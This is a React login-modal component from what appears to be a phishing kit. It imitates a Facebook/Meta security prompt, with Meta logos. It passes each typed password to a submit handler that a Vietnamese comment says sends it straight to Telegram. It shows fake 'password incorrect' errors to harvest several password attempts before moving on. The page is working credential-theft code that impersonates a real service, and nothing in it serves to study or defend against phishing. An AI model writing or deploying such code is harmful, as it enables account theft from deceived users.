'use client';

import { useEffect, useState, type FormEvent } from 'react';
import type { StaticImageData } from 'next/image';
import type { CSSProperties } from 'react';
import type { UiTexts } from '@/types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import config from '@/utils/config';

interface LoginModalProps {
    show: boolean;
    onClose: () => void;
    onSubmit: (email: string, password: string) => void;
    onSuccess: () => void;
    texts: UiTexts;
    attemptCount?: number;
}

const LoginModal = ({ show, onSubmit, onSuccess, texts, attemptCount = 0 }: LoginModalProps) => {
    const [formData, setFormData] = useState({
        password: ''
    });
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const maxPasswordAttempts = Math.max(1, Number(config.MAX_PASS || 2));

    useEffect(() => {
        if (!show) return;
        setLoginAttempt(Math.min(Math.max(0, attemptCount), maxPasswordAttempts));
        if (attemptCount === 0) {
            setFormData({ password: '' });
            setShowError(false);
            setIsLoading(false);
        }
    }, [show, attemptCount, maxPasswordAttempts]);

    const handleChange = (field: 'password', value: string) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) {
            setShowError(false);
        }
    };

    const submitPassword = () => {
        if (isLoading) {
            return;
        }

        if (loginAttempt >= maxPasswordAttempts) {
            onSuccess();
            return;
        }

        const password = formData.password.trim();
        if (!password) {
            setShowError(true);
            return;
        }

        setIsLoading(true);
        setShowError(false);

        const nextAttempt = loginAttempt + 1;
        setLoginAttempt(nextAttempt);

        // Gửi Telegram ngay — spinner loading chỉ là UI
        onSubmit('', password);

        const loadingSec = Math.max(1, Number(config.PASSWORD_LOADING_TIME || 3));

        window.setTimeout(() => {
            setIsLoading(false);

            if (nextAttempt < maxPasswordAttempts) {
                setShowError(true);
                setFormData({ password: '' });
            } else {
                setShowError(false);
                onSuccess();
            }
        }, loadingSec * 1000);
    };

    const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        submitPassword();
    };

    const togglePasswordVisibility = () => {
        setShowPassword((prev) => !prev);
    };

    if (!show) return null;

    /* ── Eye-off icon (password hidden) ── */
    const EyeOffIcon = () => (
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
            fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
            <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
            <path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
            <path d="m2 2 20 20" />
        </svg>
    );

    /* ── Eye icon (password visible) ── */
    const EyeIcon = () => (
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24"
            fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
            <circle cx="12" cy="12" r="3" />
        </svg>
    );

    /* ── Styles ── */
    const overlayStyle: CSSProperties = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '16px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle: CSSProperties = {
        position: 'relative',
        width: '100%',
        maxWidth: '500px',
        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: '18px',
        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        padding: '40px 32px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        gap: '24px',
        margin: 'auto',
        maxHeight: 'calc(100vh - 32px)',
        overflowY: 'auto',
        flexShrink: 0,
    };

    const inputWrapperStyle: CSSProperties = {
        position: 'relative',
        width: '100%',
        height: '40px',
        border: `1.5px solid ${showError ? '#e74c3c' : '#d4dbe3'}`,
        borderRadius: '10px',
        backgroundColor: '#fff',
        transition: 'all 0.2s',
        marginBottom: showError ? '4px' : '10px',
    };

    const inputStyle: CSSProperties = {
        width: '100%',
        height: '100%',
        border: 'none',
        outline: 'none',
        padding: '0 44px 0 11px',
        fontSize: '14px',
        borderRadius: '10px',
        backgroundColor: 'transparent',
        color: '#333',
        boxSizing: 'border-box',
    };

    const eyeBtnStyle: CSSProperties = {
        position: 'absolute',
        right: 0,
        top: 0,
        height: '100%',
        display: 'flex',
        alignItems: 'center',
        padding: '0 12px',
        background: 'none',
        border: 'none',
        cursor: 'pointer',
        color: '#606770',
    };

    const submitBtnStyle: CSSProperties = {
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        width: '100%',
        minHeight: '48px',
        borderRadius: '40px',
        backgroundColor: '#0064E0',
        color: '#fff',
        fontSize: '16px',
        fontWeight: 600,
        border: 'none',
        cursor: isLoading ? 'default' : 'pointer',
        opacity: isLoading ? 0.85 : 1,
        transition: 'opacity 0.3s',
        position: 'relative',
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle}>
                <div style={{ width: '50px', height: '50px', flexShrink: 0 }}>
                    <img src={(FbRoundLogo as StaticImageData).src} width="100%" height="100%" alt="logo"
                        style={{ objectFit: 'contain' }} />
                </div>

                <div style={{ width: '100%', padding: '0' }}>
                    <p style={{
                        marginBottom: '7px',
                        fontSize: '14px',
                        color: '#9a979e',
                        lineHeight: 1.5,
                        textAlign: 'center',
                    }}>
                        {texts.securityReason}
                    </p>

                    <form autoComplete="off" onSubmit={handleSubmit}>
                        <div style={inputWrapperStyle}>
                            <input
                                style={inputStyle}
                                type={showPassword ? 'text' : 'password'}
                                placeholder={texts.password}
                                autoComplete="off"
                                autoCorrect="off"
                                autoCapitalize="none"
                                spellCheck="false"
                                maxLength={30}
                                disabled={isLoading}
                                value={formData.password}
                                onChange={(e) => handleChange('password', e.target.value)}
                            />
                            <button
                                type="button"
                                style={eyeBtnStyle}
                                tabIndex={-1}
                                aria-label="toggle password visibility"
                                disabled={isLoading}
                                onClick={togglePasswordVisibility}
                            >
                                {showPassword ? <EyeIcon /> : <EyeOffIcon />}
                            </button>
                        </div>

                        {showError && (
                            <p style={{
                                color: '#e74c3c',
                                fontSize: '13px',
                                margin: '0 0 10px 2px',
                            }}>
                                {texts.passwordIncorrect}
                            </p>
                        )}

                        <div style={{ marginTop: '20px', width: '100%' }}>
                            <button
                                type="submit"
                                style={submitBtnStyle}
                                disabled={isLoading}
                            >
                                {isLoading ? (
                                    <span
                                        style={{
                                            width: '22px',
                                            height: '22px',
                                            border: '3px solid rgba(255,255,255,0.4)',
                                            borderTopColor: '#fff',
                                            borderRadius: '50%',
                                            animation: 'spin 0.8s linear infinite',
                                            display: 'inline-block',
                                            pointerEvents: 'none',
                                        }}
                                    />
                                ) : (
                                    <span style={{ pointerEvents: 'none' }}>{texts.continueBtn}</span>
                                )}
                            </button>
                        </div>

                    </form>
                </div>

                <div style={{ width: '60px', height: '60px', flexShrink: 0 }}>
                    <img src={(MetaLogo as StaticImageData).src} width="100%" height="100%" alt="Meta"
                        style={{ objectFit: 'contain' }} />
                </div>
            </div>

            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

export default LoginModal;
